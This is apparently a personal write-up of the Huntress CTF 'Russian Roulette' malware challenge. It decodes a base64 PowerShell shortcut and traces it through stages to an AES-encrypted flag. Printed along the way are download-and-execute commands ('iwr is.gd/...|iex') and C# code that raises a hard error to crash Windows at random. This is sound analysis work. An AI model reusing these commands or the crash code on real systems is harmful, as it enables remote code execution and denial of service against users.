2024-11-26 16:29

Status: #completed_huntress_CTF

Tags: [[huntressctf]] [[solved]] [[malware]] [[obfuscation]] [[ctf]] [[Cyber Security]] [[cyber security awareness month]] 

# Russian Roulette
Russian Roulette is a malware challenge that starts as a Windows Powershell link. 
Let's see what the target of that link is actually pointing at!
```
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -e aQB3AHIAIABpAHMALgBnAGQALwBqAHcAcgA3AEoARAAgAC0AbwAgACQAZQBuAHYAOgBUAE0AUAAvAC4AYwBtAGQAOwAmACAAJABlAG4AdgA6AFQATQBQAC8ALgBjAG0AZAA=
```
Nice so it looks like some [[base64]] we can decode that in cyber chef to get. 
```
iwr is.gd/jwr7JD -o $env:TMP/.cmd;& $env:TMP/.cmd
```
Looks like it is reaching out to a web page and downloading the file, to the environment variable TMP location.
We can look up what the preview method for is.gd, but we'll preview the web page by adding a - to the end.
```
 is.gd/jwr7JD-
```
Which links to this Github repository, https://github.com/user-attachments/files/17251016/powershell.zip
So lets download that, and it isn't a zip archive, but it is just a txt. and looks to be very obfuscated
Here's a small example of what it looks like 
![[huntressctf_russian_Github_file.png]]
It's quite a large document. so let's run this, since it would normally be downloaded and ran in a malicious environment.
which gives us this base64
```
aQB3AHIAIABpAHMALgBnAGQALwBRAFIARAB5AGkAUAB8AGkAZQB4AA==
```
Which gives us this cmd
```
iwr is.gd/QRDyiP|iex 
```
So it reaches out to a web page again, downloads a file and then runs it.
We can do the same thing we did last URL, and see that this location is also a Github repository https://github.com/user-attachments/files/17242481/conhost.log
Let's download the file and investigate again.
We can cat out the contents and see that it runs another Power shell command.
```
$s='using System;using System.Text;using System.Security.Cryptography;using System.Runtime.InteropServices;using System.IO;public class X{[DllImport("ntdll.dll")]public static extern uint RtlAdjustPrivilege(int p,bool e,bool c,out bool o);[DllImport("ntdll.dll")]public static extern uint NtRaiseHardError(uint e,uint n,uint u,IntPtr p,uint v,out uint r);public static unsafe string Shot(){bool o;uint r;RtlAdjustPrivilege(19,true,false,out o);NtRaiseHardError(0xc0000022,0,0,IntPtr.Zero,6,out r);byte[]c=Convert.FromBase64String("RNo8TZ56Rv+EyZW73NocFOIiNFfL45tXw24UogGdHkswea/WhnNhCNwjQn1aWjfw");byte[]k=Convert.FromBase64String("/a1Y+fspq/NwlcPwpaT3irY2hcEytktuH7LsY+NlLew=");byte[]i=Convert.FromBase64String("9sXGmK4q9LdYFdOp4TSsQw==");using(Aes a=Aes.Create()){a.Key=k;a.IV=i;ICryptoTransform d=a.CreateDecryptor(a.Key,a.IV);using(var m=new MemoryStream(c))using(var y=new CryptoStream(m,d,CryptoStreamMode.Read))using(var s=new StreamReader(y)){return s.ReadToEnd();}}}}';$c=New-Object System.CodeDom.Compiler.CompilerParameters;$c.CompilerOptions='/unsafe';$a=Add-Type -TypeDefinition $s -Language CSharp -PassThru -CompilerParameters $c;if((Get-Random -Min 1 -Max 7) -eq 1){[X]::Shot()}Start-Process "powershell.exe"   
```
This  command looks like it decrypts the flag,
I noticed the c, k, and i variable
```
c = ciphertext = RNo8TZ56Rv+EyZW73NocFOIiNFfL45tXw24UogGdHkswea/WhnNhCNwjQn1aWjfw
k = key = /a1Y+fspq/NwlcPwpaT3irY2hcEytktuH7LsY+NlLew=
i = IV = 9sXGmK4q9LdYFdOp4TSsQw==
```

so not only is it Base64 encoded it's also AES encoded.
We can decrypt that with CyberChef pretty easily.
![[HuntressCTF_russianRoulette_flag_decrypt.png]]
And we have our flag!
```
 flag{4e4f266d44717ff3af8bd92d292b79ec}
```


# Resources
[[Short URL Preview links]]